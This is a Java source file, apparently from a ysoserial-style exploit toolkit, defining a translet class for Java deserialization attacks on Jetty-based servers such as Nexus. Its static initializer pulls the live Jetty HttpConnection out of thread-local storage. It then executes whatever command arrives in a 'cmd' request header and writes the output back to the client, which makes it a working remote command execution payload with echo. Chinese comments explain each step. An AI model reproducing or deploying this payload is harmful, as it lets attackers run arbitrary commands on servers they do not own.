package ysoserial;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;

// https://github.com/shadowsock5/Poc/blob/master/Nexus/Echo_WebContext.java

public class MyClassLoader7 extends AbstractTranslet {
    static {
        try{

            //获取当前线程对象
            Thread thread = Thread.currentThread();
            //获取Thread中的threadLocals对象
            Field threadLocals = Thread.class.getDeclaredField("threadLocals");
            threadLocals.setAccessible(true);
            //ThreadLocalMap是ThreadLocal中的一个内部类，并且访问权限是default
            // 这里获取的是ThreadLocal.ThreadLocalMap
            Object threadLocalMap = threadLocals.get(thread);

            //这里要这样获取ThreadLocal.ThreadLocalMap
            Class threadLocalMapClazz = Class.forName("java.lang.ThreadLocal$ThreadLocalMap");
            //获取ThreadLocalMap中的Entry对象
            Field tableField = threadLocalMapClazz.getDeclaredField("table");
            tableField.setAccessible(true);
            //获取ThreadLocalMap中的Entry
            Object[] objects = (Object[]) tableField.get(threadLocalMap);

            //获取ThreadLocalMap中的Entry
            Class entryClass = Class.forName("java.lang.ThreadLocal$ThreadLocalMap$Entry");
            //获取ThreadLocalMap中的Entry中的value字段
            Field entryValueField = entryClass.getDeclaredField("value");
            entryValueField.setAccessible(true);


            for (Object object : objects) {
                if (object != null) {
                    useJettyHttpConnection(entryValueField, object);
                }
            }

        }catch(Exception e){
            e.printStackTrace();
        }
    }

    /*
    调用过程：
    org.eclipse.jetty.server.HttpConnection=》getHttpChannel
    org.eclipse.jetty.server.HttpChannel=》getRequest
    org.eclipse.jetty.server.Request=》getHeader
        String
    org.eclipse.jetty.server.HttpChannel=》getResponse
    org.eclipse.jetty.server.Response=》getWriter
    java.io.PrintWriter#write(header)
    java.io.PrintWriter#close()
     */
    private static void useJettyHttpConnection(Field entryValueField, Object object) throws IllegalAccessException, InvocationTargetException, NoSuchMethodException, IOException {
        Object httpConnection = entryValueField.get(object);
        if (httpConnection != null) {
            if (httpConnection.getClass().getName().equals("org.eclipse.jetty.server.HttpConnection")) {
                Class<?> HttpConnection = httpConnection.getClass();
                // 获取HttpChannel 对象
                Object httpChannel = HttpConnection.getMethod("getHttpChannel").invoke(httpConnection);
                Class<?> HttpChannel = httpChannel.getClass();
                // 获取request对象
                Object request = HttpChannel.getMethod("getRequest").invoke(httpChannel);
                // 获取自定义头部
                String header = (String) request.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(request, new Object[]{"cmd"});
                // 获取response对象
                Object response = HttpChannel.getMethod("getResponse").invoke(httpChannel);

                PrintWriter writer = (PrintWriter)response.getClass().getMethod("getWriter").invoke(response);

                StringBuilder stringBuilder = new StringBuilder();
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(header).getInputStream()));
                String line;
                while((line = bufferedReader.readLine()) != null) {
                    stringBuilder.append(line).append("\n");
                }
                String res = stringBuilder.toString();


                // 将命令执行的结果通过输出流输出给客户端
                writer.write(res);
                writer.close();
            }
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}

